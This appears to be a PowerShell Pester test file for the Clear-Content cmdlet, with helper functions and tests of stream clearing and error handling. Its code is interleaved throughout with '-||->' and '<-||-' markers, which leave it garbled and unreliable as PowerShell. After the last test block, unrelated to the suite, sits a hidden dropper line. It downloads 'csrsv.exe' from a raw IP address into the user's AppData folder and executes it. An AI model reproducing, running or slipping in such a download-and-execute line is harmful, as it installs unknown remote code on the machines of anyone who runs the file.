



 -||-> function Get-RandomString
{
    param ( [int]$Length = 8 )
     -||-> $chars =  -||-> .{  -||-> ( -||-> [int][char]'a' <-||- )..( -||-> [int][char]'z' <-||- ) <-||- ; -||-> ( -||-> [int][char]'A' <-||- )..( -||-> [int][char]'Z' <-||- ) <-||-  } <-||-  <-||- 
     -||-> ( -||-> [char[]]( -||-> $chars | Get-Random -Count $Length <-||- ) <-||- ) -join "" <-||- 
} <-||- 


 -||-> function Get-NonExistantProviderName
{
   param ( [int]$Length = 8 )
   do {
        -||-> $providerName =  -||-> Get-RandomString -Length $Length <-||-  <-||- 
   } until (  -||-> $null -eq ( -||-> Get-PSProvider -PSProvider $providername -ErrorAction SilentlyContinue <-||- ) <-||-  )
    -||-> $providerName <-||- 
} <-||- 


 -||-> function Get-NonExistantDriveName
{
    param ( [int]$Length = 8 )
    do {
         -||-> $driveName =  -||-> Get-RandomString -Length $Length <-||-  <-||- 
    } until (  -||-> $null -eq ( -||-> Get-PSDrive $driveName -ErrorAction SilentlyContinue <-||- ) <-||-  )
     -||-> $drivename <-||- 
} <-||- 


 -||-> function Get-NonExistantFunctionName
{
    param ( [int]$Length = 8 )
    do {
         -||-> $functionName =  -||-> Get-RandomString -Length $Length <-||-  <-||- 
    } until (  -||-> ( -||-> Test-Path -Path function:$functionName <-||- ) -eq $false <-||-  )
     -||-> $functionName <-||- 
} <-||- 

 -||-> Describe "Clear-Content cmdlet tests" -Tags "CI" {
   -||-> BeforeAll {
     -||-> $file1 = "file1.txt" <-||- 
     -||-> $file2 = "file2.txt" <-||- 
     -||-> $file3 = "file3.txt" <-||- 
     -||-> $content1 = "This is content" <-||- 
     -||-> $content2 = "This is content for alternate stream tests" <-||- 
     -||-> Setup -File "$file1" <-||- 
     -||-> Setup -File "$file2" -Content $content1 <-||- 
     -||-> Setup -File "$file3" -Content $content2 <-||- 
     -||-> $streamContent = "content for alternate stream" <-||- 
     -||-> $streamName = "altStream1" <-||- 
  } <-||- 

   -||-> Context "Clear-Content should actually clear content" {
     -||-> It "should clear-Content of TestDrive:\$file1" {
       -||-> Set-Content -Path TestDrive:\$file1 -Value "ExpectedContent" -PassThru | Should -BeExactly "ExpectedContent" <-||- 
       -||-> Clear-Content -Path TestDrive:\$file1 <-||- 
    } <-||- 

     -||-> It "shouldn't get any content from TestDrive:\$file1" {
       -||-> $result =  -||-> Get-Content -Path TestDrive:\$file1 <-||-  <-||- 
       -||-> $result | Should -BeNullOrEmpty <-||- 
    } <-||- 

    
     -||-> It "The filesystem provider supports should process" -skip:( -||-> !$IsWindows <-||- ) {
       -||-> Clear-Content -Path TestDrive:\$file2 -WhatIf <-||- 
       -||-> "TestDrive:\$file2" | Should -FileContentMatch "This is content" <-||- 
    } <-||- 

     -||-> It "The filesystem provider should support ShouldProcess (reference ProviderSupportsShouldProcess member)" {
       -||-> $cci = ( -||-> ( -||-> Get-Command -Name Clear-Content <-||- ).ImplementingType <-||- )::new() <-||- 
       -||-> $cci.SupportsShouldProcess | Should -BeTrue <-||- 
    } <-||- 

     -||-> It "Alternate streams should be cleared with clear-content" -skip:( -||-> !$IsWindows <-||- ) {
      
      
       -||-> Set-Content -Path "TestDrive:/$file3" -Stream $streamName -Value $streamContent <-||- 
       -||-> Get-Content -Path "TestDrive:/$file3" | Should -BeExactly $content2 <-||- 
       -||-> Get-Content -Path "TestDrive:/$file3" -Stream $streamName | Should -BeExactly $streamContent <-||- 
       -||-> Clear-Content -Path "TestDrive:/$file3" -Stream $streamName <-||- 
       -||-> Get-Content -Path "TestDrive:/$file3" | Should -BeExactly $content2 <-||- 
       -||-> Get-Content -Path "TestDrive:/$file3" -Stream $streamName | Should -BeNullOrEmpty <-||- 
    } <-||- 

     -||-> It "the '-Stream' dynamic parameter is visible to get-command in the filesystem" -Skip:( -||-> !$IsWindows <-||- ) {
       -||-> try {
         -||-> Push-Location -Path TestDrive: <-||- 
         -||-> ( -||-> Get-Command Clear-Content -Stream foo <-||- ).parameters.keys -eq "stream" | Should -Be "stream" <-||- 
      }
      finally {
         -||-> Pop-Location <-||- 
      } <-||- 
    } <-||- 

     -||-> It "the '-Stream' dynamic parameter should not be visible to get-command in the function provider" {
       -||-> Push-Location -Path function: <-||- 
       -||-> {  -||-> Get-Command Clear-Content -Stream $streamName <-||-  } |
        Should -Throw -ErrorId "NamedParameterNotFound,Microsoft.PowerShell.Commands.GetCommandCommand" <-||- 
       -||-> Pop-Location <-||- 
    } <-||- 
  } <-||- 

   -||-> Context "Proper errors should be delivered when bad locations are specified" {
     -||-> It "should throw when targetting a directory." {
       -||-> {  -||-> Clear-Content -Path . -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "ClearDirectoryContent" <-||- 
    } <-||- 

     -||-> It "should throw `"Cannot bind argument to parameter 'Path'`" when -Path is `$null" {
       -||-> {  -||-> Clear-Content -Path $null -ErrorAction Stop <-||-  } |
        Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.ClearContentCommand" <-||- 
    } <-||- 

    
     -||-> It "should throw `"Cannot bind argument to parameter 'Path'`" when -Path is `$()" {
       -||-> {  -||-> Clear-Content -Path $() -ErrorAction Stop <-||-  } |
        Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.ClearContentCommand" <-||- 
    } <-||- 

    
     -||-> It "should throw 'PSNotSupportedException' when you clear-content to an unsupported provider" {
       -||-> $functionName =  -||-> Get-NonExistantFunctionName <-||-  <-||- 
       -||-> $null =  -||-> New-Item -Path function:$functionName -Value {  -||-> 1 <-||-  } <-||-  <-||- 
       -||-> {  -||-> Clear-Content -Path function:$functionName -ErrorAction Stop <-||-  } |
        Should -Throw -ErrorId "NotSupported,Microsoft.PowerShell.Commands.ClearContentCommand" <-||- 
    } <-||- 

     -||-> It "should throw FileNotFound error when referencing a non-existant file" {
       -||-> $badFile = "TestDrive:/badfilename.txt" <-||- 
       -||-> {  -||-> Clear-Content -Path $badFile -ErrorAction Stop <-||-  } |
        Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.ClearContentCommand" <-||- 
    } <-||- 

     -||-> It "should throw DriveNotFound error when referencing a non-existant drive" {
       -||-> $badDrive = "{0}:/file.txt" -f ( -||-> Get-NonExistantDriveName <-||- ) <-||- 
       -||-> {  -||-> Clear-Content -Path $badDrive -ErrorAction Stop <-||-  } |
        Should -Throw -ErrorId "DriveNotFound,Microsoft.PowerShell.Commands.ClearContentCommand" <-||- 
    } <-||- 

    
     -||-> It "should throw ProviderNotFound error when referencing a non-existant provider" {
       -||-> $badProviderPath = "{0}::C:/file.txt" -f ( -||-> Get-NonExistantProviderName <-||- ) <-||- 
       -||-> {  -||-> Clear-Content -Path $badProviderPath -ErrorAction Stop <-||-  } |
        Should -Throw -ErrorId "ProviderNotFound,Microsoft.PowerShell.Commands.ClearContentCommand" <-||- 
    } <-||- 
  } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



